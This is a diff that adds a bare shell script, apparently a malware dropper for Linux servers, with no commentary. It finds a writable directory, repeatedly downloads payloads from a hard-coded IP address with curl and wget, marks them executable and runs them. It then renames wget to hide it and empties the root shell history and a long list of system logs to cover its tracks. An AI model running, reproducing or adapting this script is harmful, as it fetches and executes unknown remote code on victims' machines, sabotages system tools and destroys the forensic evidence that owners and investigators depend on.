@@ -1,0 +1,52 @@
+wdir="/bin"
+for i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc"
+do 
+	if [ -w $i ]; then
+		wdir=$i
+		break
+	fi
+done
+
+cd $wdir
+curl http://103.64.12.146/w.txt -o ygljglkjgfg0
+chmod +x ygljglkjgfg0
+./ygljglkjgfg0
+wget http://103.64.12.146/w.txt -O ygljglkjgfg1
+chmod +x ygljglkjgfg1
+./ygljglkjgfg1
+good http://103.64.12.146/w.txt -O ygljglkjgfg2
+chmod +x ygljglkjgfg2
+./ygljglkjgfg2
+sleep 2
+wget http://103.64.12.146/g.txt -O sdf3fslsdf13
+chmod +x sdf3fslsdf13
+./sdf3fslsdf13
+good http://103.64.12.146/g.txt -O sdf3fslsdf14
+chmod +x sdf3fslsdf14
+./sdf3fslsdf14
+curl http://103.64.12.146/g.txt -o sdf3fslsdf15
+chmod +x sdf3fslsdf15
+./sdf3fslsdf15
+sleep 2
+mv /usr/bin/wget /usr/bin/good
+mv /bin/wget /bin/good
+cat /dev/null >/root/.bash_history
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/secure
+cat /dev/null > /var/log/boot.log
+cat /dev/null > /var/log/cron
+cat /dev/null > /var/log/dmesg
+cat /dev/null > /var/log/firewalld
+cat /dev/null > /var/log/maillog
+cat /dev/null > /var/log/messages
+cat /dev/null > /var/log/spooler
+cat /dev/null > /var/log/syslog
+cat /dev/null > /var/log/tallylog
+cat /dev/null > /var/log/yum.log
+cat /dev/null >/root/.bash_history
+ls -la /etc/daemon.cfg
+exit $?;
+ ; 
+;
